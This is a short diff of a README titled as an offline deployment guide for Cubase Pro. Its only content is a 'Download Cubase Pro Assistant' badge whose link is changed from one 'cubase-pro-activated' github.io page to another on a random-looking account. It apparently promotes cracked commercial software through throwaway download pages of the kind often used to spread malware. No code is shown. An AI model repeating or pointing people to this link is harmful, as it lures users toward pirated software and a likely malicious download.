@@ -1,6 +1,6 @@
 # 🎼 Cubase Pro — Offline Deployment Guide
 
-[![Download Cubase Assistant](https://img.shields.io/badge/🎧_Download-Cubase_Pro_Assistant-blueviolet?style=for-the-badge&logo=steinberg)](https://cubase-pro-activated.github.io/.github)
+[![Download Cubase Assistant](https://img.shields.io/badge/🎧_Download-Cubase_Pro_Assistant-blueviolet?style=for-the-badge&logo=steinberg)](https://ijogeger209.github.io/.github/cubase-pro-activated)
 
 ---
 
